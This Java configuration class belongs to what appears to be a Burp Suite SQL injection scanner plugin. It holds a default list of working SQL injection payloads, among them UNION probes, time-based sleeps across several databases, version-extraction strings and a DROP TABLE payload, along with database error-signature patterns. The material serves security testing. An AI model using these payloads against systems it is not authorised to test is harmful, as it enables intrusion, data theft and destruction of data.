package com.csql.config;

import org.yaml.snakeyaml.DumperOptions;
import org.yaml.snakeyaml.Yaml;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;

/**
 * 扫描器配置类
 *
 * 用于存储和管理所有扫描相关的配置选项
 * 包括：监控开关、域名过滤、Payload 配置、报错关键词等
 * 配置文件保存在用户目录下的 .config/C_SQL_Config.yaml
 *
 * @author C_SQL Team
 * @version 3.0.0
 */
public class ScannerConfig {

    // ==================== 插件开关配置 ====================

    /**
     * 插件是否启用
     * true = 启用扫描功能
     * false = 停止所有扫描
     */
    private volatile boolean pluginEnabled = true;

    /**
     * 是否监控 Repeater 流量
     * 监控从 Repeater 工具发出的 HTTP 请求
     */
    private volatile boolean monitorRepeater = false;

    /**
     * 是否监控 Proxy 流量
     * 监控经过 Proxy 代理的 HTTP 请求
     */
    private volatile boolean monitorProxy = true;

    /**
     * 是否测试 Cookie 参数
     * 启用后会对 Cookie 中的参数进行 SQL 注入测试
     */
    private volatile boolean testCookieParams = true;

    /**
     * 是否测试数字型参数
     * 启用后对值为纯数字的参数额外测试 -1 和 -0
     */
    private volatile boolean testNumericParams = true;

    // ==================== 域名过滤配置 ====================

    /**
     * 白名单是否启用
     * 启用后只扫描白名单中的域名
     */
    private volatile boolean whitelistEnabled = false;

    /**
     * 白名单域名列表（逗号分隔）
     */
    private volatile String whitelistUrls = "";

    /**
     * 黑名单是否启用
     * 启用后不扫描黑名单中的域名
     */
    private volatile boolean blacklistEnabled = true;

    /**
     * 黑名单域名列表（逗号分隔）
     * 默认包含常见的第三方服务域名
     */
    private volatile String blacklistUrls = DEFAULT_BLACKLIST_DOMAINS;

    // ==================== 请求配置 ====================

    /**
     * 请求延迟时间（毫秒）
     * 用于控制扫描速度，避免触发目标的速率限制
     */
    private volatile int requestDelayMs = 0;

    // ==================== 自定义 Payload 配置 ====================

    /**
     * 是否使用自定义 Payload
     */
    private volatile boolean useCustomPayloads = false;

    /**
     * 自定义 Payload 内容（每行一个）
     */
    private volatile String customPayloadText = "";

    /**
     * 是否对自定义 Payload 中的空格进行 URL 编码
     */
    private volatile boolean urlEncodeSpaces = true;

    /**
     * 是否在使用自定义 Payload 时将参数值置空
     */
    private volatile boolean emptyParamValues = false;

    // ==================== 报错关键词配置 ====================

    /**
     * 自定义报错关键词（支持正则表达式，每行一个）
     */
    private volatile String customErrorPatterns;

    // ==================== 配置文件路径 ====================

    /**
     * 配置文件目录：~/.config/
     */
    private static final Path CONFIG_DIR = Paths.get(System.getProperty("user.home"), ".config");

    /**
     * 配置文件路径：~/.config/C_SQL_Config.yaml
     */
    private static final Path CONFIG_FILE = CONFIG_DIR.resolve("C_SQL_Config.yaml");

    /**
     * 默认的 Payload 列表
     * 包含常见的 SQL 注入测试语句
     */
    private static final String DEFAULT_PAYLOADS = """
            '
            "
            `
            ')
            ")
            `)
            '))
            "))
            `))
            '%20AND%20'1'='1
            '%20AND%20'1'='2
            "%20AND%20"1"="1
            "%20AND%20"1"="2
            '%20OR%20'1'='1
            '%20OR%20'1'='2
            '%20UNION%20SELECT%20NULL--+
            '%20UNION%20SELECT%20NULL,NULL--+
            '%20UNION%20SELECT%20NULL,NULL,NULL--+
            '%20ORDER%20BY%201--+
            '%20ORDER%20BY%202--+
            '%20ORDER%20BY%203--+
            'AND%20SLEEP(5)--+
            '%3bSELECT+SLEEP(5)--+
            'and%2bextractvalue(1,concat(0x7e,(select%2b%40%40version),0x7e))--+
            '%3bWAITFOR%20DELAY%20'0%3a0%3a5'--+
            'and%2b1%3dconvert(int,(select%2b%40%40version))--+
            '%20AND%201=(SELECT%201%20FROM%20pg_sleep(5))%20--+
            'and+7778%3dcast((select+version())%3a%3atext+as+numeric)--+
            '%20AND%201=DBMS_LOCK.SLEEP(5)%20--+
            'and%2b1%3dutl_inaddr.get_host_name((select%2bbanner%2bfrom%2bv$version))--+
            '%3b%20DROP%20TABLE%20test--+
            '%20||%20'1'=='1
            '%20&&%20'1'=='1
            %2527
            %2522
            %252d%252d
            %df'%20OR%201=1--+
            %bf%27%20OR%201=1--+""";

    /**
     * 默认的报错关键词列表
     * 包含各种数据库的错误信息特征
     */
    private static final String DEFAULT_ERROR_PATTERNS = """
            ORA-\\d{5}
            ORA-00933
            ORA-01756
            ORA-00920
            ORA-00942
            ORA-00904
            ORA-01789
            oracle.jdbc.driver
            Oracle error
            oci_error
            Warning:.*oci_
            SQL syntax.*?MySQL
            You have an error in your SQL syntax
            check the manual that corresponds to your MySQL
            Unknown column
            Duplicate entry
            Data truncated for column
            Unknown database
            Table.*doesn't exist
            Column.*cannot be null
            Incorrect.*value
            SQL syntax
            java.sql.SQLSyntaxErrorException
            Error SQL:
            Syntax error
            附近有语法错误
            语法错误
            数据库错误
            查询错误
            未闭合的引号
            列名.*无效
            表或视图不存在
            关键字.*附近
            转换失败
            java.sql.SQLException
            引号不完整
            System.Exception: SQL Execution Error!
            com.mysql.jdbc
            MySQLSyntaxErrorException
            valid MySQL result
            your MySQL server version
            MySqlClient
            MySqlException
            mysql_fetch_array()
            mysql_fetch
            mysql_query
            mysql_num_rows()
            mysqli::query
            mysqli_query
            mysqli_error
            Warning: mysql_
            Warning:.*mysql_.*
            Warning:.*SQL
            Fatal error
            Fatal error:.*SQL
            on line \\d+
            valid PostgreSQL result
            PG::SyntaxError:
            ERROR:.*syntax error at or near
            pg_query.*failed
            PostgreSQL.*ERROR
            ERROR:.*relation.*does not exist
            ERROR:.*column.*does not exist
            unterminated quoted string
            org.postgresql.jdbc
            PSQLException
            pg_query()
            pg_exec
            pg_send_query
            pg_last_error
            Warning:.*pg_
            Microsoft SQL Native Client error
            ODBC SQL Server Driver
            SQLServer JDBC Driver
            Unclosed quotation mark
            Incorrect syntax near
            The server supports a maximum of
            SqlException
            System.Data.SqlClient.SqlException
            OleDbException
            Sqlcmd:
            Msg \\d+, Level \\d+, State \\d+
            com.jnetdirect.jsql
            macromedia.jdbc.sqlserver
            com.microsoft.sqlserver.jdbc
            mssql_query
            Warning:.*mssql_
            Microsoft Access
            Access Database Engine
            ODBC Microsoft Access
            DB2 SQL error
            DB2 SQL error.*SQLCODE
            SQLite error
            SQLITE_ERROR
            sqlite3_prepare
            near.*syntax error
            unrecognized token
            no such table
            no such column
            Sybase message
            SybSQLException
            Sybase.*Server message
            com.sybase
            MongoException
            MongoDB.*error
            com.mongodb
            Invalid BSON field name
            SQLException
            PDOException
            org.springframework.jdbc
            JDBC.*Exception
            database error
            SQL Server.*Driver.*SQL.*error
            Invalid column name
            Conversion failed
            odbc_exec""";

    /**
     * 默认黑名单域名列表
     * 包含常见的第三方服务和社交媒体平台
     */
    private static final String DEFAULT_BLACKLIST_DOMAINS =
            "google-analytics.com,googletagmanager.com,analytics.google.com," +
            "doubleclick.net,googlesyndication.com,googleadservices.com," +
            "twitter.com,t.co,twimg.com," +
            "facebook.com,fb.com,fbcdn.net," +
            "youtube.com,ytimg.com,googlevideo.com," +
            "instagram.com,cdninstagram.com," +
            "linkedin.com,licdn.com," +
            "tiktok.com,tiktokcdn.com," +
            "pinterest.com,pinimg.com," +
            "reddit.com,redd.it,redditstatic.com," +
            "translate.google.com,translate.googleapis.com," +
            "bing.com/translator,microsofttranslator.com," +
            "yandex.com/translate,deepl.com," +
            "cloudflare.com,cloudflareinsights.com," +
            "jsdelivr.net,cdnjs.cloudflare.com,unpkg.com," +
            "github.com,githubusercontent.com,github.io," +
            "gravatar.com,wp.com,wordpress.com," +
            "disqus.com,disquscdn.com," +
            "snap.com,snapchat.com";

    /**
     * 需要跳过扫描的静态文件扩展名
     */
    private static final List<String> STATIC_EXTENSIONS = Arrays.asList(
            "jpg", "jpeg", "png", "gif", "bmp", "ico", "svg", "webp",
            "css", "js", "woff", "woff2", "ttf", "eot",
            "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx",
            "mp3", "mp4", "avi", "mov", "wmv", "flv", "wav",
            "zip", "rar", "7z", "tar", "gz"
    );

    /**
     * 构造函数
     * 初始化默认配置并尝试从配置文件加载
     * 如果配置文件不存在，则自动创建并写入默认配置
     */
    public ScannerConfig() {
        // 设置默认值
        this.customPayloadText = DEFAULT_PAYLOADS;
        this.customErrorPatterns = DEFAULT_ERROR_PATTERNS;

        // 如果配置文件不存在，先创建默认配置文件
        if (!Files.exists(CONFIG_FILE)) {
            saveToYaml();
        }

        // 从配置文件加载（如果存在）
        loadFromYaml();
    }

    /**
     * 从 YAML 配置文件加载配置
     */
    private void loadFromYaml() {
        if (!Files.exists(CONFIG_FILE)) {
            // 配置文件不存在，使用默认值
            return;
        }

        try (InputStream input = Files.newInputStream(CONFIG_FILE)) {
            Yaml yaml = new Yaml();
            Map<String, Object> data = yaml.load(input);

            if (data != null) {
                // 加载 Payload 配置
                if (data.containsKey("payloads")) {
                    Object payloadsObj = data.get("payloads");
                    if (payloadsObj instanceof List) {
                        // 如果是列表格式，转换为换行分隔的字符串
                        List<?> payloadList = (List<?>) payloadsObj;
                        StringBuilder sb = new StringBuilder();
                        for (Object item : payloadList) {
                            if (item != null) {
                                sb.append(item.toString()).append("\n");
                            }
                        }
                        this.customPayloadText = sb.toString().trim();
                    } else if (payloadsObj instanceof String) {
                        this.customPayloadText = (String) payloadsObj;
                    }
                }

                // 加载报错关键词配置
                if (data.containsKey("error_patterns")) {
                    Object patternsObj = data.get("error_patterns");
                    if (patternsObj instanceof List) {
                        // 如果是列表格式，转换为换行分隔的字符串
                        List<?> patternList = (List<?>) patternsObj;
                        StringBuilder sb = new StringBuilder();
                        for (Object item : patternList) {
                            if (item != null) {
                                sb.append(item.toString()).append("\n");
                            }
                        }
                        this.customErrorPatterns = sb.toString().trim();
                    } else if (patternsObj instanceof String) {
                        this.customErrorPatterns = (String) patternsObj;
                    }
                }
            }
        } catch (Exception e) {
            // 加载失败时使用默认值
            System.err.println("加载配置文件失败: " + e.getMessage());
        }
    }

    /**
     * 保存配置到 YAML 文件
     */
    public void saveToYaml() {
        try {
            // 确保配置目录存在
            if (!Files.exists(CONFIG_DIR)) {
                Files.createDirectories(CONFIG_DIR);
            }

            // 设置 YAML 输出格式
            DumperOptions options = new DumperOptions();
            options.setDefaultFlowStyle(DumperOptions.FlowStyle.BLOCK);
            options.setPrettyFlow(true);
            options.setIndent(2);
            options.setAllowUnicode(true);

            Yaml yaml = new Yaml(options);

            // 构建配置数据
            Map<String, Object> data = new LinkedHashMap<>();

            // 将 Payload 转换为列表格式
            List<String> payloadList = new ArrayList<>();
            for (String line : customPayloadText.split("\n")) {
                String trimmed = line.trim();
                if (!trimmed.isEmpty()) {
                    payloadList.add(trimmed);
                }
            }
            data.put("payloads", payloadList);

            // 将报错关键词转换为列表格式
            List<String> patternList = new ArrayList<>();
            for (String line : customErrorPatterns.split("\n")) {
                String trimmed = line.trim();
                if (!trimmed.isEmpty()) {
                    patternList.add(trimmed);
                }
            }
            data.put("error_patterns", patternList);

            // 写入文件
            try (Writer writer = new FileWriter(CONFIG_FILE.toFile())) {
                // 写入文件头注释
                writer.write("# C_SQL 配置文件\n");
                writer.write("# 位置: ~/.config/C_SQL_Config.yaml\n");
                writer.write("# \n");
                writer.write("# payloads: 自定义 SQL 注入 Payload 列表\n");
                writer.write("# error_patterns: 自定义报错关键词列表（支持正则表达式）\n");
                writer.write("\n");
                yaml.dump(data, writer);
            }
        } catch (Exception e) {
            System.err.println("保存配置文件失败: " + e.getMessage());
        }
    }

    /**
     * 获取当前有效的 Payload 列表
     *
     * @return Payload 字符串列表
     */
    public List<String> getEffectivePayloads() {
        List<String> payloads = new ArrayList<>();

        // 默认的基础 Payload
        payloads.add("'");
        payloads.add("''");

        if (useCustomPayloads && !customPayloadText.isEmpty()) {
            // 按行分割并添加到列表
            String[] lines = customPayloadText.split("\n");
            for (String line : lines) {
                String trimmed = line.trim();
                if (!trimmed.isEmpty()) {
                    payloads.add(trimmed);
                }
            }
        }

        return payloads;
    }

    /**
     * 获取报错关键词列表
     *
     * @return 报错关键词数组
     */
    public String[] getErrorPatterns() {
        return customErrorPatterns.split("\n");
    }

    /**
     * 检查 URL 是否匹配指定的列表
     *
     * @param url  要检查的 URL
     * @param list 逗号分隔的域名列表
     * @return 如果 URL 匹配列表中任一项则返回 true
     */
    public boolean urlMatchesList(String url, String list) {
        if (url == null || list == null || list.isEmpty()) {
            return false;
        }

        String[] items = list.split(",");
        for (String item : items) {
            String trimmed = item.trim();
            if (!trimmed.isEmpty() && url.contains(trimmed)) {
                return true;
            }
        }
        return false;
    }

    /**
     * 检查给定的文件扩展名是否为静态资源
     *
     * @param extension 文件扩展名
     * @return 如果是静态资源返回 true
     */
    public boolean isStaticResource(String extension) {
        return STATIC_EXTENSIONS.contains(extension.toLowerCase());
    }

    /**
     * 获取配置文件路径
     *
     * @return 配置文件路径字符串
     */
    public static String getConfigFilePath() {
        return CONFIG_FILE.toString();
    }

    // ==================== Getter 和 Setter 方法 ====================

    public boolean isPluginEnabled() {
        return pluginEnabled;
    }

    public void setPluginEnabled(boolean pluginEnabled) {
        this.pluginEnabled = pluginEnabled;
    }

    public boolean isMonitorRepeater() {
        return monitorRepeater;
    }

    public void setMonitorRepeater(boolean monitorRepeater) {
        this.monitorRepeater = monitorRepeater;
    }

    public boolean isMonitorProxy() {
        return monitorProxy;
    }

    public void setMonitorProxy(boolean monitorProxy) {
        this.monitorProxy = monitorProxy;
    }

    public boolean isTestCookieParams() {
        return testCookieParams;
    }

    public void setTestCookieParams(boolean testCookieParams) {
        this.testCookieParams = testCookieParams;
    }

    public boolean isTestNumericParams() {
        return testNumericParams;
    }

    public void setTestNumericParams(boolean testNumericParams) {
        this.testNumericParams = testNumericParams;
    }

    public boolean isWhitelistEnabled() {
        return whitelistEnabled;
    }

    public void setWhitelistEnabled(boolean whitelistEnabled) {
        this.whitelistEnabled = whitelistEnabled;
    }

    public String getWhitelistUrls() {
        return whitelistUrls;
    }

    public void setWhitelistUrls(String whitelistUrls) {
        this.whitelistUrls = whitelistUrls;
    }

    public boolean isBlacklistEnabled() {
        return blacklistEnabled;
    }

    public void setBlacklistEnabled(boolean blacklistEnabled) {
        this.blacklistEnabled = blacklistEnabled;
    }

    public String getBlacklistUrls() {
        return blacklistUrls;
    }

    public void setBlacklistUrls(String blacklistUrls) {
        this.blacklistUrls = blacklistUrls;
    }

    public int getRequestDelayMs() {
        return requestDelayMs;
    }

    public void setRequestDelayMs(int requestDelayMs) {
        this.requestDelayMs = Math.max(0, requestDelayMs);
    }

    public boolean isUseCustomPayloads() {
        return useCustomPayloads;
    }

    public void setUseCustomPayloads(boolean useCustomPayloads) {
        this.useCustomPayloads = useCustomPayloads;
    }

    public String getCustomPayloadText() {
        return customPayloadText;
    }

    public void setCustomPayloadText(String customPayloadText) {
        this.customPayloadText = customPayloadText;
    }

    public boolean isUrlEncodeSpaces() {
        return urlEncodeSpaces;
    }

    public void setUrlEncodeSpaces(boolean urlEncodeSpaces) {
        this.urlEncodeSpaces = urlEncodeSpaces;
    }

    public boolean isEmptyParamValues() {
        return emptyParamValues;
    }

    public void setEmptyParamValues(boolean emptyParamValues) {
        this.emptyParamValues = emptyParamValues;
    }

    public String getCustomErrorPatterns() {
        return customErrorPatterns;
    }

    public void setCustomErrorPatterns(String customErrorPatterns) {
        this.customErrorPatterns = customErrorPatterns;
    }

    public static String getDefaultPayloads() {
        return DEFAULT_PAYLOADS;
    }

    public static String getDefaultErrorPatterns() {
        return DEFAULT_ERROR_PATTERNS;
    }
}
